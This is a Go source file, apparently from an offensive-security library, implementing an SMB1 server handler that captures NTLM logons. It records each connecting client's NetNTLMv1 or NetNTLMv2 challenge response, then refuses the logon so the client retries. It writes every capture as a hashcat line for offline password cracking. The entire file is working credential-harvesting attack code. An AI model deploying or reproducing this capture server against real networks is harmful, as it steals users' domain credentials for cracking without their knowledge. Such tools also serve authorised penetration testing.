package server

import (
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/TheManticoreProject/Manticore/crypto/ntlmv1"
	"github.com/TheManticoreProject/Manticore/crypto/ntlmv2"
	"github.com/TheManticoreProject/Manticore/crypto/spnego"
	"github.com/TheManticoreProject/Manticore/logger"
	"github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message"
	"github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message/commands"
	"github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message/commands/codes"
	"github.com/TheManticoreProject/Manticore/windows/nt_status"
)

// Credential is one authentication attempt harvested from a client.
//
// Everything in it is what the client asserted, verified against nothing. That is
// the point: the response is worth keeping precisely when the server cannot
// confirm it, because it can be cracked offline instead.
type Credential struct {
	// RemoteAddr is the client the attempt came from, and Time when it arrived.
	RemoteAddr net.Addr
	Time       time.Time

	// Domain, Username and Workstation are the identity the client claimed.
	Domain      string
	Username    string
	Workstation string

	// ServerChallenge is the challenge this server issued, which the response
	// answers. Cracking needs it, so a response recorded without it is useless.
	ServerChallenge [8]byte

	// LmResponse and NtResponse are the responses as received. The length of
	// NtResponse is what distinguishes NetNTLMv1 from NetNTLMv2: 24 bytes is v1,
	// longer is v2.
	LmResponse []byte
	NtResponse []byte
}

// Account renders the claimed identity as DOMAIN\user, or just the username when
// no domain was claimed.
func (c Credential) Account() string {
	if c.Domain == "" {
		return c.Username
	}
	return c.Domain + "\\" + c.Username
}

// IsNTLMv2 reports whether the attempt carried a NetNTLMv2 response.
func (c Credential) IsNTLMv2() bool {
	return len(c.NtResponse) > 24
}

// Hashcat renders the attempt in the form hashcat expects, together with the mode
// number that form belongs to: mode 5600 for NetNTLMv2, mode 5500 for NetNTLMv1.
//
// The two modes use different field layouts, so the mode is returned alongside
// the line rather than left for a caller to guess.
//
// Returns:
//   - The hashcat line
//   - The hashcat mode the line is in
//   - An error if the response cannot be rendered
func (c Credential) Hashcat() (string, int, error) {
	var lm [24]byte
	copy(lm[:], c.LmResponse)

	switch {
	case c.IsNTLMv2():
		response := ntlmv2.NewNTLMv2Response(c.Username, c.Domain, c.ServerChallenge, lm, c.NtResponse)
		line, err := response.HashcatString()
		if err != nil {
			return "", 0, err
		}
		return line, ntlmv2.HashcatMode, nil

	case len(c.NtResponse) == 24:
		var nt [24]byte
		copy(nt[:], c.NtResponse)
		response := ntlmv1.NewNTLMv1Response(c.Username, c.Domain, c.ServerChallenge, lm, nt)
		line, err := response.HashcatString()
		if err != nil {
			return "", 0, err
		}
		return line, ntlmv1.HashcatMode, nil
	}

	return "", 0, fmt.Errorf("NT response is %d bytes, which is neither a NetNTLMv1 nor a NetNTLMv2 response", len(c.NtResponse))
}

// CaptureConfig configures a CaptureHandler.
type CaptureConfig struct {
	// OnCredential is called for each harvested attempt, on the goroutine serving
	// the connection, so an implementation that blocks holds that client up. Nil
	// logs the attempt instead.
	OnCredential func(Credential)

	// OutputFile appends each attempt's hashcat line to a file, created if
	// absent. Empty disables file output. Lines from both modes land in the same
	// file, each prefixed with a comment naming its mode, since a mixed file
	// cannot be fed to hashcat unsorted.
	OutputFile string

	// UniquePerUser records only the first attempt seen for an identity. A client
	// refused a logon typically retries, so without this one user produces
	// several identical-looking lines.
	UniquePerUser bool

	// Status is the status returned to the client after an attempt is recorded.
	// The zero value means STATUS_LOGON_FAILURE, which is usually what is wanted:
	// a client that believes it mistyped a password often retries with another
	// credential.
	Status nt_status.NT_STATUS
}

// CaptureHandler harvests NTLM authentication attempts.
//
// Registered on a Server, it intercepts the second leg of a session setup, records
// what the client sent, and refuses the logon. Everything else — negotiation, the
// challenge leg — falls through to the built-in dispatch, so the server still
// behaves like a server on the wire; a client has no way to tell that the refusal
// was the point.
//
// It is safe for concurrent use across connections.
type CaptureHandler struct {
	config CaptureConfig

	// mutex guards the captured list and the seen set.
	mutex       sync.Mutex
	credentials []Credential
	seen        map[string]bool

	// fileMutex serializes appends to the output file, separately from the
	// in-memory state so a slow write does not block another connection's
	// capture from being recorded.
	fileMutex sync.Mutex
}

// NewCaptureHandler creates a capture handler.
//
// Parameters:
//   - config: how to report and record what is captured
//
// Returns:
//   - The handler
//   - An error if the configuration cannot be honoured
func NewCaptureHandler(config CaptureConfig) (*CaptureHandler, error) {
	if config.Status == 0 {
		config.Status = nt_status.NT_STATUS_LOGON_FAILURE
	}
	if config.OutputFile != "" {
		// Fail now rather than on the first capture, when a client is waiting and
		// the material would be lost.
		file, err := os.OpenFile(config.OutputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
		if err != nil {
			return nil, fmt.Errorf("failed to open the capture output file %q: %v", config.OutputFile, err)
		}
		file.Close()
	}

	return &CaptureHandler{
		config: config,
		seen:   make(map[string]bool),
	}, nil
}

// Credentials returns a copy of what has been harvested so far.
func (h *CaptureHandler) Credentials() []Credential {
	h.mutex.Lock()
	defer h.mutex.Unlock()

	captured := make([]Credential, len(h.credentials))
	copy(captured, h.credentials)
	return captured
}

// Run intercepts the second leg of a session setup, records the attempt and
// refuses it.
//
// It returns false for everything else, including the challenge leg, so the
// built-in dispatch answers those normally.
func (h *CaptureHandler) Run(srv *Server, conn *Connection, w ResponseWriter, req *message.Message) bool {
	if req.Header.Command != codes.SMB_COM_SESSION_SETUP_ANDX {
		return false
	}
	// Only the second leg carries a response to capture. The first has no UID
	// yet: it carries the client's NEGOTIATE, and the built-in handler answers it
	// with the challenge that the response will be computed against.
	accept := conn.PendingAuth(uint16(req.Header.UID))
	if accept == nil {
		return false
	}

	request, ok := req.Command.(*commands.SessionSetupAndxRequest)
	if !ok || len(request.SecurityBlob) == 0 {
		return false
	}

	if err := accept.AcceptAuthenticateToken([]byte(request.SecurityBlob)); err != nil {
		logger.Debugf("SMB1 server: could not read the NTLM AUTHENTICATE from %s: %v", conn.Remote, err)
		// Let the built-in handler produce the protocol error, rather than
		// answering with a logon failure for something that was not a logon.
		return false
	}

	h.record(conn, accept)

	if err := w.WriteError(h.config.Status); err != nil {
		logger.Debugf("SMB1 server: failed to refuse the logon from %s: %v", conn.Remote, err)
	}
	return true
}

// record builds a Credential from an authentication exchange and reports it.
func (h *CaptureHandler) record(conn *Connection, accept *spnego.AcceptContext) {
	authenticate := accept.Authenticate
	if authenticate == nil {
		return
	}

	domain, username, workstation := accept.Identity()

	credential := Credential{
		RemoteAddr:      conn.Remote,
		Time:            time.Now().UTC(),
		Domain:          domain,
		Username:        username,
		Workstation:     workstation,
		ServerChallenge: accept.ServerChallenge,
		// Copy the responses: they alias the buffer the request was decoded
		// from, which the connection reuses for the next frame.
		LmResponse: append([]byte(nil), authenticate.LmChallengeResponse...),
		NtResponse: append([]byte(nil), authenticate.NtChallengeResponse...),
	}

	// An anonymous or null-session attempt carries no response worth keeping.
	if len(credential.NtResponse) == 0 {
		logger.Debugf("SMB1 server: %s attempted an anonymous logon as %q, nothing to capture",
			conn.Remote, credential.Account())
		return
	}

	h.mutex.Lock()
	if h.config.UniquePerUser {
		key := strings.ToLower(credential.Account())
		if h.seen[key] {
			h.mutex.Unlock()
			logger.Debugf("SMB1 server: already captured %s, ignoring the retry from %s",
				credential.Account(), conn.Remote)
			return
		}
		h.seen[key] = true
	}
	h.credentials = append(h.credentials, credential)
	h.mutex.Unlock()

	h.report(credential)
}

// report hands a captured attempt to the configured sink and appends it to the
// output file, if one is configured.
func (h *CaptureHandler) report(credential Credential) {
	// Render once: both sinks want the same line, and a response that cannot be
	// rendered is worth saying so about exactly once.
	line, mode, renderErr := credential.Hashcat()

	if h.config.OnCredential != nil {
		h.config.OnCredential(credential)
	} else if renderErr != nil {
		logger.Warnf("SMB1 server: captured an unrenderable response from %s for %s: %v",
			credential.RemoteAddr, credential.Account(), renderErr)
	} else {
		logger.Infof("Captured NetNTLM (hashcat mode %d) for %s from %s",
			mode, credential.Account(), credential.RemoteAddr)
		logger.Plain.Info(line)
	}

	if h.config.OutputFile == "" || renderErr != nil {
		return
	}
	if err := h.appendLine(mode, line); err != nil {
		logger.Errorf("SMB1 server: failed to write the captured response for %s: %v", credential.Account(), err)
	}
}

// appendLine appends one hashcat line to the output file, prefixed with a comment
// naming the mode it belongs to, since the two modes cannot be fed to hashcat
// from one unsorted file.
//
// The file is opened per line rather than held open: a capture run is low-volume,
// and a file closed after every line keeps everything harvested so far even if the
// process is killed mid-run.
func (h *CaptureHandler) appendLine(mode int, line string) error {
	h.fileMutex.Lock()
	defer h.fileMutex.Unlock()

	file, err := os.OpenFile(h.config.OutputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = fmt.Fprintf(file, "# hashcat mode %d\n%s\n", mode, line)
	return err
}

// Compile-time assurance that CaptureHandler satisfies the Handler contract.
var _ Handler = (*CaptureHandler)(nil)
